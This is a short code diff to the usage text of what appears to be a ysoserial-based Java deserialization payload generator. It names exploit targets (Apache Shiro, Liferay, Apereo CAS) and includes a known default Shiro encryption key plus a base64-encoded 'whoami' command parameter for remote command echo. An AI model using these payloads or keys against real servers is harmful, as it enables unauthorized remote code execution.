@@ -56,10 +56,10 @@ public class GeneratePayload {
         System.err.println("Author: JF");
         System.err.println("\n");
         System.err.println("\n");
-        System.err.println("Usage: java -jar yso-echo-all.jar shiro_CommonsBeanutils1 linux [key default kPH+bIxk5D2deZiIxcaaaA==]");
-        System.err.println("Usage: java -jar yso-echo-all.jar shiro_CommonsBeanutils1 linux 0AvVhmFLUs0KTA3Kprsdag==");
-        System.err.println("Usage: java -jar yso-echo-all.jar [payload] win");
-        System.err.println("Usage: java -jar yso-echo-all.jar [payload] linux");
+        System.err.println("Usage: java -jar yso-echo-all.jar shiro linux [key default kPH+bIxk5D2deZiIxcaaaA==]");
+        System.err.println("Usage: java -jar yso-echo-all.jar shiro linux 0AvVhmFLUs0KTA3Kprsdag==");
+        System.err.println("Usage: java -jar yso-echo-all.jar liferay win");
+        System.err.println("Usage: java -jar yso-echo-all.jar apereo linux");
         System.err.println("[Add Request get/post parameter] c=d2hvYW1p (whoami)");
         System.err.println("  Available payload types:");
 
